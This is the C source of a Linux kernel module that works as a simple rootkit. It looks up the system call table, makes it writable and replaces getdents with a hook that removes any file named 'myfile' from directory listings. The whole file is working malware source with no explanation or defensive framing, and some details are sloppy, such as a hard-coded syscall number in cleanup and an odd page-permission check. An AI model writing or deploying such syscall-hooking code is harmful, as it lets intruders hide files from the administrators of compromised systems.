#define MODULE
#define LINUX
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
       };

static unsigned long **p_sys_call_table;
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirp, unsigned int count);


asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, unsigned int count)
{
        int nread;
        struct linux_dirent *d;
        int bpos = 0;
        int rem;
        char file_name[256] = {0};
        struct linux_dirent copied;
        char* tempbuf;

        nread = original_getdents(fd, dirp, count);

        for (bpos = 0; bpos < nread;) {
            d = (struct linux_dirent *) ((char*)dirp + bpos);
            strncpy_from_user(file_name, d->d_name, 256);

            copy_from_user(&copied, d, 24);

            if (strcmp(file_name, "myfile") == 0){
                rem = count - (bpos + copied.d_reclen);

                tempbuf = kmalloc(sizeof(char) * count, GFP_KERNEL);
                copy_from_user(tempbuf, dirp, count);

                memmove(tempbuf + bpos ,tempbuf + bpos + copied.d_reclen, rem);

                copy_to_user(dirp, tempbuf, count);

                kfree(tempbuf);

                nread -= copied.d_reclen;
                return nread;   
            }
            bpos += copied.d_reclen;
        }

        return nread;
}

int set_page_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
    return 0;
}

int set_page_ro(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
    return 0;
}

int init_module(void)
{
    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");

    set_page_rw((unsigned long)p_sys_call_table);

    original_getdents = (void*)p_sys_call_table[__NR_getdents];
    p_sys_call_table[__NR_getdents] = (void*)sys_getdents_hook;
    return 0;
}

void cleanup_module(void)
{       
    p_sys_call_table[78] = (void*)original_getdents;
    set_page_ro((unsigned long)p_sys_call_table);

}  
MODULE_LICENSE("GPL");